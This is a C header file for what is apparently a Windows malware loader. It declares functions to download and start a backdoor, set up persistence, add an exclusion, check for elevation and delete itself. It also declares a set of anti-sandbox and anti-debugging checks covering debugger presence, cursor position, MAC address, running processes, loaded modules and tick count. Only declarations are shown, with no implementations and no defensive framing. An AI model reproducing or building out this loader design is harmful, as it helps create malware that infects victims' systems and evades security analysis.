#ifndef HEADERS_H_INCLUDED
#define HEADERS_H_INCLUDED

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <wininet.h>
#include <iphlpapi.h>
#include <psapi.h>
#include <string.h>
#include <shlwapi.h>
#include <sysinfoapi.h>
#include <Urlmon.h>
#include <Shlobj.h>

// init headers
char* download_backdoor(char *appdata_path);
HANDLE create_mutex();
void destroy_mutex(HANDLE mutex);
void self_delete(char *loader_path);
void start_backdoor(char *backdoor_path);
void exclude(char *appdata_path);
void persistence(char *backdoor_path);
BOOL is_elevated();

// sandbox headers
#define MAXMEMORY 999999999
#define OPERATION_MAX 99999999

int check_debugger();
int check_cursor_pos();
int check_memory_alloc();
int check_operation();
int check_my_name(char *name);
int check_url();
int check_mac();
int check_processes();
int check_modules(DWORD  process_id);
int check_tick_count();

#endif // HEADERS_H_INCLUDED
